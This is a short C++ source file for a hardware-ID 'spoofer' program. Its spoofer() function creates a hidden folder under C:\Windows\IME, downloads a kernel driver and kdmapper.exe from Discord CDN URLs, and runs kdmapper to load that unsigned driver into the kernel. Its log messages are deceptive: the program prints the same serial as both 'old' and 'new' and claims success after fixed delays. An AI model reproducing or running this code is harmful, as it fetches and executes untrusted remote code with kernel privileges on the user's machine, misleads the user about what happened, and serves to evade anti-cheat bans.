
#include "Main.h"		
#include <direct.h>

void spoofer()
{

	        _mkdir("C:\\Windows\\IME\\Neox");
		URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748710451067748413/759530833350230016/btbd.sys", L"C:\\Windows\\IME\\Neox\\btbd.sys", 0, NULL);
		URLDownloadToFile(NULL, L"https://cdn.discordapp.com/attachments/748710451067748413/759530748939862036/kdmapper.exe", L"C:\\Windows\\IME\\Neox\\kdmapper.exe", 0, NULL);
		System("C:\\Windows\\IME\\Neox\\kdmapper.exe C:\\Windows\\IME\\Neox\\btbd.sys");
}


int main()
{
	SetConsoleTitleA("YourFirstPastedC++ Spoofer");

	S_LogType LogType;
	std::string HWID = GetHWID();

	Log("Getting Neoxs Brain Cells", LogType.Info);


	Log("Done\n", LogType.Success);
	Sleep(2000);

	Log("Press a key to start\n", LogType.Info);
	getchar();





	Log("Spoofing DiskDrive(s), Volume ID(s), NIC, SMBIOS, GPU, CPU, BaseBoard", LogType.Default); Sleep(5000);
	Log("Old C: Serial: " + HWID, LogType.Warning);

	spoofer();

	Log("New C: Serial: " + HWID, LogType.Warning);
	Log("Spoofed DiskDrive(s), Volume ID(s), NIC, SMBIOS, GPU, CPU, BaseBoard\n", LogType.Success);

	Log("Spoofer done.", LogType.Default);

	return 0;
}
